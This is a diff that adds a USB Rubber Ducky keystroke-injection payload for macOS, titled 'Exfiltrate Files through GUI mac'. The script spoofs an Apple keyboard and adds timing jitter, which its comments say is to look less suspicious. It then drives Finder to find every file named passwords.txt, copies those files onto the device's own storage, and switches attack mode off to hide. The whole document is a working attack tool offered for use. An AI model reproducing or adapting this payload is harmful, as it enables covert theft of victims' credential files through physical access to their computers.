@@ -1,0 +1,95 @@
+REM ###################################################
+REM #                                                 |
+REM # Title        : Exfiltrate Files through GUI mac |
+REM # Author       : Kile                             |
+REM # Version      : 1.0                              |
+REM # Category     : Exfiltration                     |
+REM # Target       : MacOS                            |
+REM #                                                 |
+REM ###################################################
+
+REM NOTE This is not unlikely to fail depending on the speed of search or if a large amount of files meet the criteria. Adjust DELAYs to your needs
+
+ATTACKMODE STORAGE HID VID_05AC PID_021E
+DELAY 2000
+
+REM the filename for the payload to look for
+DEFINE #target passwords.txt
+
+REM Given that it uses the GUI it is a good idea to enable jitter to be less suspicious
+$_JITTER_ENABLED = TRUE
+
+REM This function tabs the amount of times it takes from a finder search to go onto the first file result (4)
+FUNCTION DO_TABS()
+    VAR $COUNTER = 0
+    WHILE ($COUNTER < 4)
+        TAB
+        DELAY 100
+        $COUNTER = ($COUNTER + 1)
+    END_WHILE
+END_FUNCTION
+
+REM Open finder
+COMMAND SPACE
+STRINGLN finder
+DELAY 500
+REM Command n spawns a new window. This makes sure there is only one finder tab (for tabbing to the files later)
+COMMAND n 
+
+REM Open search bar in finder
+COMMAND f
+DELAY 200
+REM type target filename
+STRING #target
+DELAY 200
+REM This specifies that the passwords.txt has to be a filename and not be in any file
+DOWN
+ENTER
+ENTER
+
+REM Give a bit to find all files
+DELAY 500
+REM now 4 tabs to get to the first file result
+DO_TABS()
+
+REM select all files that have the specified target in their name
+COMMAND a
+REM Copy the files
+COMMAND c
+DELAY 500
+REM Go back to search window
+COMMAND f
+DELAY 200
+REM Delete previous search
+DEL
+
+REM Search for DUCKY USB
+STRING DUCKY
+DELAY 200
+DOWN
+ENTER
+REM Specifies that the "DUCKY" has to be an external USB drive
+STRING Volume
+DELAY 200
+DOWN
+DOWN
+DOWN
+ENTER
+ENTER
+REM This can take annoyingly long to show up which is why the delay is so big
+DELAY 6000
+
+REM Go to first result
+DO_TABS()
+
+REM Open the drive
+COMMAND o
+DELAY 1000
+REM This takes a few seconds
+
+REM Paste the copied files. As this may take a few seconds given on how many results there were there is a long delay
+COMMAND v
+DELAY 7000
+
+REM Hide
+ATTACKMODE OFF
